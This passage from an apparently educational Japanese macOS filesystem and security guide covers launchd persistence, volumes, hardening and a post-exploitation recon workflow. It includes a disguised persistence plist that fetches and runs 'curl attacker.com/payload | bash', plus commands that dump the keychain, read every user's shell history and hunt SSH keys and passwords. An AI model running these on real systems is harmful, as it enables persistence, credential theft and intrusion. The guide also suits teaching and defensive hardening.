$ cat ~/Library/LaunchAgents/com.example.agent.plist
$ plutil -p ~/Library/LaunchAgents/com.example.agent.plist

# List all currently loaded launchd jobs
$ launchctl list
$ launchctl list | grep -v com.apple    # filter out Apple's own (focus on 3rd-party)

# Load / unload a launch agent manually
$ launchctl load ~/Library/LaunchAgents/com.example.agent.plist
$ launchctl unload ~/Library/LaunchAgents/com.example.agent.plist

# Example malicious-style persistence plist structure:
cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>     <!-- disguised name -->
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

# ── LOGIN ITEMS (GUI-visible startup apps) ──────────────────────────
$ osascript -e 'tell application "System Events" to get the name of every login item'

# ── LEGACY CRON (still works, but rarely used by modern macOS) ─────
$ crontab -l
$ sudo crontab -l -u root

# ── PERIODIC SCRIPTS (built-in maintenance, rarely abused but exists) ─
$ ls /etc/periodic/daily/
$ ls /etc/periodic/weekly/
$ ls /etc/periodic/monthly/

# ── AUDIT FOR SUSPICIOUS PERSISTENCE (quick triage) ──────────────────
$ for dir in ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons; do
    echo "=== $dir ==="
    ls -la "$dir" 2>/dev/null
done
```

### 永続化ロケーションの優先度表

| ロケーション | 実行主体 | メモ | ペンテストでの価値 |
|--------------|---------|------|---------------------|
| `~/Library/LaunchAgents/` | 現在のユーザー | 管理者権限不要 | 最重要 |
| `/Library/LaunchAgents/` | ログイン中の任意のユーザー | 書き込みに管理者権限が必要 | 最重要 |
| `/Library/LaunchDaemons/` | root | 管理者権限が必要、ログインなしで実行 | 最重要 |
| `/System/Library/LaunchDaemons/` | root | SIP保護（Apple専用） | 低（防御済み） |
| Login Items | 現在のユーザー | System Settingsに表示される | 高 |

---

## 17. Volumesとapfs — 現代のボリューム構造

`/Volumes`には、Linuxの`/mnt`と`/media`に似た、マウントされたすべての外部ドライブ、ネットワーク共有、ディスクイメージが含まれる。ブートドライブ（`Macintosh HD`）もここに自己参照として表示される。

```bash
# List mounted volumes
$ ls /Volumes/
$ diskutil list

# Mount a disk image (.dmg)
$ hdiutil attach SomeApp.dmg

# Unmount a volume
$ diskutil unmount /Volumes/USB_DRIVE
$ diskutil eject /Volumes/USB_DRIVE

# Check disk usage
$ df -h

# View APFS container details
$ diskutil apfs list

# Create an APFS snapshot (used by Time Machine)
$ tmutil snapshot

# List Time Machine snapshots
$ tmutil listlocalsnapshots /

# Check FileVault encryption status
$ fdesetup status
FileVault is On.

# Mount a remote SMB/AFP share
$ mount_smbfs //user@server/share /Volumes/share
```

| パス | 機能 |
|------|------|
| `/Volumes/` | 外部ドライブとネットワーク共有 |
| `diskutil` | ディスク・パーティション管理 |
| `tmutil` | Time Machineとスナップショット |
| `fdesetup` | FileVault制御 |

---

## 18. セキュリティノート: 機微なロケーションと防御的ハードニング

以下のロケーションは攻撃者と防御者の双方にとって高価値だ。管理下にあるMacでのTCC/SIP監査、キーチェーンの衛生管理、LaunchAgentのハードニングに使い、権限昇格の攻略手順としては使わないこと。

```bash
# ── HIGH-VALUE PATHS (defender inventory) ────────────────────
~/Library/Keychains/login.keychain-db
/Library/Keychains/System.keychain
# Prefer FileVault + strong login password; lock keychain when idle

~/Library/Application\ Support/com.apple.TCC/TCC.db
# Audit privacy grants; reset overly broad app permissions

~/.ssh/                 # private keys: mode 700/600
~/.zsh_history          # avoid secrets on CLI

~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
# Inventory plist labels; alert on unsigned / unexpected jobs

# Platform protections (verify enabled)
csrutil status          # SIP
spctl --status          # Gatekeeper
fdesetup status         # FileVault
```

### 防御的ハードニングの重点

| コントロール | 対応 |
|-------------|------|
| FileVault | フルディスク暗号化 |
| SIP / Gatekeeper | 有効のまま維持 |
| Keychain | アイドル時ロック、ログイン共有をしない |
| LaunchAgents | 署名付きplistのベースライン化 |
| TCC | プライバシー権限を最小限に |
| SSH鍵 | `chmod 600`、パスフレーズを使う |
| 統合ロギング | 認証イベントを転送 |

予期しないLaunchDaemons、無効化されたSIP/Gatekeeper、誰でも書き込めるLaunchAgent plistは、いずれも重大なハードニングの所見である（Apple Platform Security Guideを参照）。

### macOSセキュリティ優先度表

| ロケーション | リスクレベル | 理由 |
|--------------|---------------|------|
| `login.keychain-db` | 最重要 | 保存されたパスワードと証明書 |
| `TCC.db` | 最重要 | プライバシー権限データベース |
| `~/.ssh/id_rsa` | 高 | SSH秘密鍵 |
| `LaunchAgents/Daemons` | 最重要 | 主要な永続化ベクター |
| `.zsh_history` | 高 | コマンド履歴とパスワード |
| `chat.db` / `History.db` | 高 | 機微な個人データ |
| `/etc/sudoers` | 最重要 | root権限の設定 |
| `.DS_Store` | 中 | フォルダ構造の漏洩 |
| `DiagnosticReports/` | 中 | クラッシュとメモリの詳細 |

---

## ディレクトリ一覧リファレンス表

| ディレクトリ | 機能 | Linuxでの相当物 |
|-------------|------|-------------------|
| `/` | ルートディレクトリ（ファームリンクビュー） | `/` |
| `/Applications` | インストール済みアプリケーション | `/usr/share/applications`（おおよそ） |
| `/System` | コアOS、SIP保護 | `/usr`、`/lib`（合わせて） |
| `/Library` | システムレベルのアプリデータ | `/etc`、`/var/lib`（おおよそ） |
| `~/Library` | ユーザーごとのアプリデータ | `~/.config`、`~/.local/share` |
| `/Users` | ユーザーホームディレクトリ | `/home` |
| `/private/etc` | Unix設定 | `/etc` |
| `/private/var` | 可変データとログ | `/var` |
| `/private/tmp` | 一時ファイル | `/tmp` |
| `/bin`、`/sbin` | 必須Unixバイナリ | `/bin`、`/sbin` |
| `/usr` | Unix共有リソース | `/usr` |
| `/opt/homebrew` | パッケージマネージャー（Apple Silicon） | `/usr/local` |
| `/Volumes` | 外部ドライブとマウント | `/mnt`、`/media` |

---

## 19. 実践ワークフロー例

```bash
# ── SCENARIO: macOS post-exploitation filesystem recon ──────────────

# 1. Who am I and what privileges do I have?
$ whoami
$ id
$ groups
$ dscl . -read /Groups/admin GroupMembership

# 2. System information
$ sw_vers                              # macOS version
$ uname -a
$ system_profiler SPHardwareDataType   # hardware details
$ sysctl -n machdep.cpu.brand_string   # CPU info

# 3. List all local users
$ dscl . list /Users | grep -v "^_"
$ dscl . -read /Users/alice

# 4. Check SIP and Gatekeeper status
$ csrutil status
$ spctl --status

# 5. Hunt for credentials in Keychain
$ security dump-keychain ~/Library/Keychains/login.keychain-db
$ security find-generic-password -ga "wifi-network-name"

# 6. Check shell history across all users
$ for user in $(dscl . list /Users | grep -v "^_"); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done

# 7. Find SSH keys
$ find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 8. Check persistence locations
$ ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/
$ launchctl list | grep -v com.apple

# 9. Check login items
$ osascript -e 'tell application "System Events" to get the name of every login item'

# 10. Check sudo privileges
$ sudo -l

# 11. Find writable system locations (privesc)
$ find / -writable -type d 2>/dev/null | grep -v -E "^/(dev|proc|private/var/folders)"

# 12. Check installed applications for known vulnerable versions
$ system_profiler SPApplicationsDataType > installed_apps.txt

# 13. Search for credentials in config files
$ grep -r "password" ~/Library/Application\ Support/ 2>/dev/null | head -20

# 14. Check recent security-related unified log events
$ log show --predicate 'eventMessage contains "authentication" OR eventMessage contains "sudo"' --last 1d

# 15. Check TCC database for privacy permission grants (Full Disk Access apps etc.)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client, service FROM access WHERE auth_value=2;"
```

---

## クイックリファレンス早見表

```bash
# ── NAVIGATION ───────────────────────────────────────────────────
cd /                                # go to root
ls -la ~/Library                    # hidden per-user library
chflags nohidden ~/Library          # unhide Library in Finder
open .                              # open current dir in Finder
open -a "Terminal" .                # open in new Terminal window

# ── SYSTEM INFO ──────────────────────────────────────────────────
sw_vers                             # macOS version
uname -a                            # kernel info
system_profiler SPHardwareDataType  # hardware details
sysctl -n hw.model                  # Mac model identifier
uname -m                            # arm64 (Apple Silicon) or x86_64 (Intel)

# ── USER & GROUPS ────────────────────────────────────────────────
dscl . list /Users                  # all user accounts
dscl . -read /Users/<user>          # user details
dscl . -read /Groups/admin GroupMembership   # admin members
id; whoami; groups

# ── KEYCHAIN ─────────────────────────────────────────────────────
security list-keychains
security find-generic-password -ga "ServiceName"
security dump-keychain ~/Library/Keychains/login.keychain-db

# ── SECURITY PROTECTIONS ─────────────────────────────────────────
csrutil status                      # SIP status
spctl --status                      # Gatekeeper status
xattr -d com.apple.quarantine file  # remove quarantine flag
codesign -dv --verbose=4 app.app    # check code signature

# ── PERSISTENCE LOCATIONS ────────────────────────────────────────
~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
launchctl list | grep -v com.apple

# ── LOGS (UNIFIED LOGGING) ───────────────────────────────────────
log show --last 1h
log stream --predicate 'process == "sshd"'
log show --predicate 'eventMessage contains "password"' --last 1d

# ── NETWORK INFO ──────────────────────────────────────────────────
lsof -i -P                          # listening ports (netstat replacement)
networksetup -listallhardwareports
scutil --dns

# ── FIND COMMANDS ────────────────────────────────────────────────
find / -name "*.plist" 2>/dev/null              # find plist configs
find / -perm -4000 2>/dev/null                  # find SUID files
find / -writable -type d 2>/dev/null            # find writable dirs
find /Users -name "id_rsa" 2>/dev/null          # find SSH keys
find / -name "*.app" -maxdepth 4 2>/dev/null    # find installed apps

# ── DISK & VOLUMES ───────────────────────────────────────────────
diskutil list                       # list disks/volumes
df -h                                # disk usage
fdesetup status                      # FileVault encryption status
tmutil listlocalsnapshots /          # Time Machine snapshots

# ── APP BUNDLE ANALYSIS ──────────────────────────────────────────
plutil -p App.app/Contents/Info.plist     # read plist as JSON-like
otool -L App.app/Contents/MacOS/App        # linked libraries
lipo -info App.app/Contents/MacOS/App      # architecture info
codesign -d --entitlements - App.app       # entitlements
```

---

> 参考文献:
> - Apple, *Apple Platform Security Guide* (`https://support.apple.com/guide/security/welcome/web`)
> - [Apple Developer — File System Programming Guide](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/)
> - Brian Ward, *How Linux Works* (`~/Documents/Books/CyberSec/Linux/`) — DarwinにもUnixファイルシステムの概念が転用できる
> - [HackTheBox Academy - macOS Fundamentals](https://academy.hackthebox.com)
> - [Objective-See - macOS Security Resources](https://objective-see.org)
> - `man hier` — macOSファイルシステム階層のマニュアルページ

> **LearnCybersecurity** | 基礎シリーズ | kodoktheGr3at | 2026
> **リポジトリ:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
> **フィードバックと貢献を歓迎します。** 誤りを見つけたらissueかPRを開いてください。
